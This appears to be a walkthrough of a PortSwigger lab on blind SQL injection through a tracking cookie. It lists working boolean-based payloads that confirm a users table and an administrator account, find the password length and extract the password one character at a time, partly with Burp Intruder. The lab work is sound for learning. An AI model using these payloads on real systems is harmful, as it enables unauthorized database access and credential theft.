## Welcome, my friend. Today we will start the [13. SQLLI lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) in ```portswigger```
### Let's play this lab:

### We discover this page and find category paramater.

### We notice ```Cookie: TrackingId=ebVJ3SqBjZlzaJ5h;``` this param is vulnerable and inject following payload:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND '1'='1;
```

![image](https://github.com/user-attachments/assets/120cd618-a4c4-4398-a269-48a2db7cb86f)

### ```Welcome back``` printed so This is always ```true``` because ```1=1``` is true.
### Try ```1=2``` is false through following payload:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND '1'='2;
```

### ```Welcome back``` doesn't printed so This is always ```false``` because ```1=2``` is false.

#### We know that there is one table is ```users``` and there are two columns ```username```,```password``` and there username is ```administrator``` and require his password.

### Ok We can using this payload to sure from exist ```users``` table:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND (SELECT 'a' FROM users LIMIT 1)='a;
```

![image](https://github.com/user-attachments/assets/b5e818cc-d11e-4033-8a65-f81e6f9f6dc0)

### Ok , There is ```users``` table.

### Now We can using this payload to sure from exist ```administrator``` account:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND (SELECT 'a' FROM users WHERE username='administrator')='a;
```

![image](https://github.com/user-attachments/assets/12e29cc6-ad37-4c1e-a27a-2a977b9141cc)

### Ok , There is ```administrator``` account.


## Now we start guess password of administrator but in first we want know how much letters of passwords:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a;
```

![image](https://github.com/user-attachments/assets/357d50f5-a58f-4ee5-afc3-92fa554cd1e2)

### password is greater than ```one``` letter.

### Try again then reach number of letters:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a;
```

![image](https://github.com/user-attachments/assets/ae5d3ad4-2350-438c-b051-43959b5ec3ff)


### Wow now we know that password is 20 letters.

### Let's find this letters:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;
```

![image](https://github.com/user-attachments/assets/29465357-0f32-4079-a783-fb6381c10fd0)


### The first letter is ```a```, Let's find second letter:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a;
```

### But this prccess is take long time, So we using burp tool:

```
Cookie: TrackingId=ebVJ3SqBjZlzaJ5h' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='¬ßa¬ß;
```

### the second letter is ```5```, We works again to find all letters susch as above video.

### We find password is ```a58ylg7b7eiupyrws0q8``` Let's login with administrator.
